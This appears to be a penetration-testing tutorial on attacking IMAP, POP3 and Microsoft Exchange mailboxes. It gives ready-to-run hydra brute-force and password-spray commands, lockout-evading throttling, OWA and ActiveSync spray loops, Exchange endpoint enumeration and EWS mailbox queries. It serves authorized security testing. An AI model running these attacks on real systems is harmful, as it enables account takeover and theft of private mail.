# IMAP/POP3 and Exchange Server Attack Guide

> Complete guide for mailbox attacks: IMAP/POP3 brute force, Exchange Autodiscover exploitation, OWA/ActiveSync attacks, and credential harvesting via mail protocols.
> All techniques are for authorized penetration testing only.

---

## Introduction and Objective

Mailbox access represents a high-value objective in penetration testing. Email accounts contain sensitive corporate communications, credentials to other systems, password reset links, and internal documents. Compromising a single mailbox often provides the foothold needed to escalate access across the entire organization.

This guide covers attacks against two categories of mail services:

1. **IMAP/POP3 attacks** -- Standard mail access protocols used by virtually all mail servers (Postfix, Dovecot, Courier, Exchange). These attacks focus on credential brute force and protocol-level weaknesses.

2. **Microsoft Exchange attacks** -- Enterprise mail servers with additional attack surfaces including OWA (Outlook Web Access), Autodiscover, ActiveSync, EWS (Exchange Web Services), and Exchange-specific vulnerabilities (ProxyLogon, ProxyShell, etc.).

By the end of this guide, you will be able to perform credential attacks against IMAP/POP3 services, enumerate and exploit Exchange server endpoints, harvest credentials via mail protocol probing, and provide remediation recommendations for mailbox security.

### Attack Surface Overview

```
Internet --> [OWA / ActiveSync / Autodiscover / EWS] --> Exchange Server
         --> [IMAP:143 / IMAPS:993 / POP3:110 / POP3S:995] --> Mail Server
         --> [SMTP:25 / Submission:587 / SMTPS:465] --> Mail Transfer Agent
```

Each exposed service represents a potential credential attack vector. Enterprise environments often expose all of these simultaneously, providing multiple paths to mailbox compromise.

---

## Hands-on Exercises

### Exercise 1: IMAP/POP3 Service Discovery

Before attacking mailbox services, identify which protocols are exposed and how they are configured.

```bash
# Scan for all mail service ports
nmap -sV -p 25,110,143,465,587,993,995,2525 target.com

# Detailed service version detection
nmap -sV --version-intensity 5 -p 110,143,993,995 target.com

# IMAP banner grabbing (reveals server software)
nc mail.target.com 143
# Expected output: * OK [CAPABILITY IMAP4rev1 ...] Dovecot ready.

# POP3 banner grabbing
nc mail.target.com 110
# Expected output: +OK Dovecot ready.

# IMAP capability query
nc mail.target.com 143
# Type: a001 CAPABILITY
# Response shows supported authentication mechanisms

# POP3 capability query
nc mail.target.com 110
# Type: CAPA
# Response shows supported capabilities

# SSL/TLS service detection
nmap --script ssl-cert -p 993,995 target.com
```

The banner and capabilities reveal the server software (Dovecot, Courier, Cyrus, Exchange) and supported authentication methods (PLAIN, LOGIN, CRAM-MD5, NTLM, GSSAPI). This information determines which attack techniques are applicable.

### Exercise 2: IMAP Credential Brute Force

IMAP (Internet Message Access Protocol) provides full mailbox access including reading, searching, and managing folders. Port 143 is unencrypted IMAP; port 993 is IMAPS (IMAP over TLS).

**Manual credential testing** -- Verify connectivity and test individual credentials:

```bash
# Test IMAP over SSL
openssl s_client -connect mail.target.com:993 -quiet
# At the prompt, type:
# a001 LOGIN username password
# Success: a001 OK LOGIN completed
# Failure: a001 NO LOGIN failed
# a002 LOGOUT

# Test IMAP without SSL
nc mail.target.com 143
# a001 LOGIN username password
# a002 LOGOUT

# Test with specific credentials
(echo "a001 LOGIN admin password123"; sleep 2; echo "a002 LOGOUT") | openssl s_client -connect mail.target.com:993 -quiet 2>/dev/null
```

**Automated brute force with hydra** -- The primary tool for credential attacks:

```bash
# Basic IMAP brute force with single username
hydra -l admin -P /usr/share/wordlists/rockyou.txt mail.target.com imap

# IMAP brute force with username list
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt mail.target.com imap

# IMAPS (SSL) brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt mail.target.com imaps

# IMAP brute force with custom port
hydra -l admin -P passwords.txt mail.target.com imap -s 143

# Password spray (one password, many users) -- lower detection risk
hydra -L users.txt -p "Welcome1!" mail.target.com imap -t 1 -W 5

# Throttled brute force to avoid account lockout
hydra -l admin -P passwords.txt mail.target.com imap -t 1 -W 10 -f

# Brute force with domain prefix (Exchange IMAP)
hydra -l "domain\\admin" -P passwords.txt mail.target.com imap

# Brute force with UPN format
hydra -l "admin@target.com" -P passwords.txt mail.target.com imap
```

**Important hydra parameters for mail attacks:**

- `-t 1` -- Single thread (avoids triggering rate limiting)
- `-W 10` -- Wait 10 seconds between attempts (evades lockout policies)
- `-f` -- Stop after first valid credential found
- `-e nsr` -- Test null password, same as login, and reversed login
- `-u` -- Loop through users instead of passwords (for password spraying)

**Credential validation after discovery:**

```bash
# Verify credentials with mutt
mutt -f imaps://admin:discovered-password@mail.target.com/INBOX

# List all folders
mutt -f imaps://admin:discovered-password@mail.target.com/

# Access specific folder
mutt -f imaps://admin:discovered-password@mail.target.com/Sent
mutt -f imaps://admin:discovered-password@mail.target.com/Archive
```

### Exercise 3: POP3 Credential Brute Force

POP3 (Post Office Protocol version 3) provides simpler mailbox access than IMAP -- it primarily downloads messages. Port 110 is unencrypted; port 995 is POP3S.

**Manual POP3 testing:**

```bash
# POP3 over SSL
openssl s_client -connect mail.target.com:995 -quiet
# At the prompt:
# USER admin
# PASS password123
# +OK = success, -ERR = failure
# LIST (list messages)
# RETR 1 (retrieve message 1)
# QUIT

# POP3 without SSL
nc mail.target.com 110
# USER admin
# PASS password123
# LIST
# QUIT
```

**Automated POP3 brute force:**

```bash
# POP3 brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt mail.target.com pop3

# POP3S brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt mail.target.com pop3s

# Password spray against POP3
hydra -L users.txt -p "Summer2026!" mail.target.com pop3 -t 1 -W 5

# Multiple users, multiple passwords with throttling
hydra -L users.txt -P common-passwords.txt mail.target.com pop3 -t 2 -W 3 -f
```

### Exercise 4: Exchange Server Discovery and Enumeration

Microsoft Exchange is the most widely deployed enterprise mail platform and presents a large attack surface beyond standard IMAP/POP3.

**Step 1: Identify Exchange endpoints**

```bash
# Check common Exchange URLs
curl -s -I https://mail.target.com/owa/
curl -s -I https://mail.target.com/ecp/
curl -s -I https://mail.target.com/Microsoft-Server-ActiveSync
curl -s -I https://mail.target.com/EWS/Exchange.asmx
curl -s -I https://mail.target.com/Autodiscover/Autodiscover.xml
curl -s -I https://mail.target.com/rpc/rpcproxy.dll
curl -s -I https://mail.target.com/mapi/
curl -s -I https://mail.target.com/PowerShell/

# Check alternative hostnames
curl -s -I https://autodiscover.target.com/Autodiscover/Autodiscover.xml
curl -s -I https://exchange.target.com/owa/

# DNS-based discovery
dig SRV _autodiscover._tcp.target.com +short
dig CNAME autodiscover.target.com +short
dig CNAME mail.target.com +short
```

**Step 2: Autodiscover exploitation**

Autodiscover is an Exchange service that automatically configures mail clients. It leaks internal hostnames, URLs, and sometimes allows credential probing.

```bash
# Request Autodiscover XML
curl -s https://mail.target.com/Autodiscover/Autodiscover.xml

# POST Autodiscover request
curl -s -X POST https://mail.target.com/Autodiscover/Autodiscover.xml \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="utf-8"?>
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
  <Request>
    <EMailAddress>user@target.com</EMailAddress>
    <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
  </Request>
</Autodiscover>'

# Try all Autodiscover URL patterns
for path in Autodiscover/Autodiscover.xml autodiscover/autodiscover.xml \
  AutoDiscover/AutoDiscover.xml autodiscover.xml; do
  echo "[*] Testing /$path"
  curl -s -o /dev/null -w "%{http_code}" https://mail.target.com/$path
  echo ""
done

# Extract internal URLs from Autodiscover response
curl -s https://mail.target.com/Autodiscover/Autodiscover.xml | grep -oP 'https?://[^<]+'
```

**Step 3: Exchange version detection**

```bash
# Version detection via HTTP headers
curl -s -I https://mail.target.com/owa/ | grep -iE "server|x-powered-by|x-aspnet-version"

# Version via OWA login page
curl -s https://mail.target.com/owa/auth/logon.aspx | grep -iE "exchange|version|15\.|14\."

# Version via ECP
curl -s https://mail.target.com/ecp/ | grep -iE "exchange|version"

# Map version to known CVEs
# Exchange 2010: 14.x
# Exchange 2013: 15.0.x
# Exchange 2016: 15.1.x
# Exchange 2019: 15.2.x
```

### Exercise 5: OWA and ActiveSync Credential Attacks

OWA (Outlook Web Access) and ActiveSync provide web-based and mobile access to Exchange mailboxes. These endpoints often accept domain credentials and can be targeted for brute force or password spraying.

**OWA credential testing:**

```bash
# Identify OWA login form
curl -s https://mail.target.com/owa/auth/logon.aspx | grep -i "input\|form\|action\|name="

# OWA brute force with hydra (adapt form parameters to target)
hydra -l admin -P passwords.txt mail.target.com https-post-form \
  "/owa/auth/logon.aspx:username=^USER^&password=^PASS^:F=incorrect"

# OWA with domain prefix
hydra -l "TARGET\\admin" -P passwords.txt mail.target.com https-post-form \
  "/owa/auth/logon.aspx:username=^USER^&password=^PASS^:F=incorrect"

# OWA with UPN format
hydra -l "admin@target.com" -P passwords.txt mail.target.com https-post-form \
  "/owa/auth/logon.aspx:username=^USER^&password=^PASS^:F=incorrect"

# Password spray against OWA (lower detection risk)
for pass in "Welcome1!" "Summer2026!" "Password1!" "Company2026!" "Winter2025!"; do
  echo "[*] Spraying: $pass"
  hydra -L users.txt -p "$pass" mail.target.com https-post-form \
    "/owa/auth/logon.aspx:username=^USER^&password=^PASS^:F=incorrect" -t 1 -W 5
  sleep 300  # 5-minute delay between spray rounds
done
```

**ActiveSync probing:**

```bash
# Check ActiveSync support
curl -s -X OPTIONS https://mail.target.com/Microsoft-Server-ActiveSync \
  -H "MS-ASProtocolVersion: 14.1"

# ActiveSync with credentials
curl -s -u "user@target.com:password" \
  "https://mail.target.com/Microsoft-Server-ActiveSync?Cmd=Sync&User=user@target.com&DeviceId=testdevice&DeviceType=test"

# ActiveSync brute force
hydra -l admin -P passwords.txt mail.target.com https-get \
  "/Microsoft-Server-ActiveSync?Cmd=Sync&User=^USER^&DeviceId=test&DeviceType=test" \
  -m "Authorization: Basic base64encoded"
```

### Exercise 6: Exchange Web Services (EWS) Exploitation

EWS is a SOAP-based API for Exchange that provides full mailbox access programmatically.

```bash
# Check EWS availability
curl -s -I https://mail.target.com/EWS/Exchange.asmx

# EWS with basic authentication
curl -s -u "user@target.com:password" https://mail.target.com/EWS/Exchange.asmx

# EWS with NTLM authentication
curl -s --ntlm -u "domain\\user:password" https://mail.target.com/EWS/Exchange.asmx

# Enumerate mailbox folders via EWS
curl -s -X POST https://mail.target.com/EWS/Exchange.asmx \
  -H "Content-Type: text/xml" \
  -u "user@target.com:password" \
  -d '<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
  <soap:Body>
    <FindFolder xmlns="http://schemas.microsoft.com/exchange/services/2006/messages"
      xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" Traversal="Shallow">
      <FolderShape><t:BaseShape>Default</t:BaseShape></FolderShape>
      <ParentFolderIds><t:DistinguishedFolderId Id="msgfolderroot"/></ParentFolderIds>
    </FindFolder>
  </soap:Body>
</soap:Envelope>'
```

### Exercise 7: Credential Harvesting via Protocol Probing

Mail protocol responses often leak information that aids credential attacks.

```bash
# IMAP capability analysis for auth mechanisms
nc mail.target.com 143
# a001 CAPABILITY
# Look for: AUTH=PLAIN, AUTH=LOGIN, AUTH=CRAM-MD5, AUTH=NTLM, AUTH=GSSAPI
# PLAIN and LOGIN transmit passwords in clear text (vulnerable if no TLS)

# POP3 auth mechanism detection
nc mail.target.com 110
# CAPA
# Look for: USER, SASL PLAIN, SASL LOGIN, STLS

# Exchange version to CVE mapping
# After identifying Exchange version, check for:
# CVE-2021-26855 (ProxyLogon) - Exchange 2013/2016/2019
# CVE-2021-34473 (ProxyShell) - Exchange 2016/2019
# CVE-2021-27065 (ProxyLogon RCE) - Exchange 2013/2016/2019
# CVE-2022-41082 (ProxyNotShell) - Exchange 2016/2019
# CVE-2023-21709 - Exchange 2016/2019

# Check for legacy auth enabled (Basic Auth over IMAP/POP3/SMTP)
# If legacy auth is enabled, brute force is much easier
openssl s_client -connect mail.target.com:993 -quiet
# a001 CAPABILITY
# If AUTH=PLAIN or AUTH=LOGIN present, legacy auth is enabled
```

### Exercise 8: Full Mailbox Attack Workflow

Combine all techniques into a structured attack workflow:

```bash
#!/bin/bash
# Mailbox Security Assessment Script
TARGET=$1

echo "=========================================="
echo "Mailbox Security Assessment: $TARGET"
echo "=========================================="

echo ""
echo "[Phase 1] Service Discovery"
echo "-----------------------------------"
nmap -sV -p 25,110,143,465,587,993,995 $TARGET

echo ""
echo "[Phase 2] IMAP Capability Analysis"
echo "-----------------------------------"
(echo "a001 CAPABILITY"; sleep 2; echo "a002 LOGOUT") | nc -w 3 $TARGET 143 2>/dev/null

echo ""
echo "[Phase 3] Exchange Endpoint Discovery"
echo "-----------------------------------"
for endpoint in owa ecp Autodiscover/Autodiscover.xml Microsoft-Server-ActiveSync EWS/Exchange.asmx mapi PowerShell; do
  code=$(curl -s -o /dev/null -w "%{http_code}" https://$TARGET/$endpoint 2>/dev/null)
  echo "  /$endpoint: HTTP $code"
done

echo ""
echo "[Phase 4] Exchange Version Detection"
echo "-----------------------------------"
curl -s -I https://$TARGET/owa/ 2>/dev/null | grep -iE "server|x-powered-by|x-aspnet"

echo ""
echo "[Phase 5] TLS Configuration"
echo "-----------------------------------"
openssl s_client -connect $TARGET:993 -showcerts 2>/dev/null | openssl x509 -noout -dates -subject -issuer 2>/dev/null

echo ""
echo "[Phase 6] Credential Test (manual)"
echo "-----------------------------------"
echo "  Run manually with validated username list:"
echo "  hydra -L users.txt -P passwords.txt $TARGET imap -t 1 -W 5 -f"
echo "  hydra -L users.txt -P passwords.txt $TARGET imaps -t 1 -W 5 -f"

echo ""
echo "=========================================="
echo "Assessment Complete"
echo "=========================================="
```

---

## References and Resources

### Protocol Documentation

- **RFC 3501** -- INTERNET MESSAGE ACCESS PROTOCOL - VERSION 4rev1 (IMAP)
  - https://tools.ietf.org/html/rfc3501
- **RFC 1939** -- Post Office Protocol - Version 3 (POP3)
  - https://tools.ietf.org/html/rfc1939
- **RFC 2595** -- Using TLS with IMAP, POP3 and ACAP
  - https://tools.ietf.org/html/rfc2595
- **MS-OXPROTO** -- Exchange Server Protocols Overview
  - https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxproto/

### Exchange Security References

- **ProxyLogon (CVE-2021-26855, CVE-2021-27065)** -- Microsoft Exchange Server RCE
  - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855
- **ProxyShell (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207)** -- Exchange Server RCE Chain
  - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473
- **Microsoft Exchange Server Security Guide**
  - https://learn.microsoft.com/en-us/exchange/plan-and-deploy/security-best-practices/security-best-practices

### Tools Documentation

- **hydra** -- Online credential cracking tool
  - `man hydra` or `hydra -h`
  - https://github.com/vanhauser-thc/thc-hydra
- **mutt** -- Terminal-based email client
  - `man mutt`
  - http://www.mutt.org/
- **openssl s_client** -- TLS connection testing
  - `man s_client`

### Learning Resources

- **HackTricks - Pentesting IMAP**
  - https://book.hacktricks.xyz/pentesting/pentesting-imap
- **OWASP - Testing for Weak Password**
  - https://owasp.org/www-project-web-security-testing-guide/
- **Exchange Autodiscover Protocol**
  - https://learn.microsoft.com/en-us/exchange/client-developer/exchange-web-services/autodiscover-for-exchange
